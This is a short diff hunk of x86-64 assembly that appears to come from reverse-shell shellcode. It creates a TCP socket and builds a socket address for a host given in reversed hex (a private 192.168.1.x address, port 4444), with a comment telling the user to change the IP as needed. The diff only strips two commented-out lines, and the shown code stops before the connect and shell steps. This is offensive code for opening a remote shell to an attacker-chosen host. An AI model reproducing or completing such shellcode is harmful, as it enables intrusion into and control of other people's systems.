@@ -8,14 +8,12 @@ _start:
         mov al, 41
         mov dil, 2
         mov sil, 1
-        ;mov dl, r11b ;use a zero'ed register to move zero value into rdx
         syscall
 
         mov rdi, rax
 
         xor rax, rax
 
-        ;push rax
         ; change IP as reverse hex as needed
         mov dword [rsp-4], 0x7b01a8c0
         mov word [rsp-6], 0x5c11
